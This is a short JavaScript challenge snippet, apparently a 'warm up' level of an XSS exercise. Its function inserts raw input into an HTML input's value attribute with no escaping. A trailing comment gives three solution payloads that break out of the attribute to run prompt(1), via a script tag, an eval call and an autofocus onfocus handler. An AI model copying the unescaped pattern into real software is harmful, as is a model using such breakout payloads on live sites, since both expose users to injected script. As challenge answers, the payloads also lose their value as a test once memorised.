function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}

/*

">
<script>
eval('prompt(1);');
</script>
<div

 OR

 " onfocus=javascript:prompt(1) autofocus>

 OR

"><script>prompt(1)</script>
 *
/
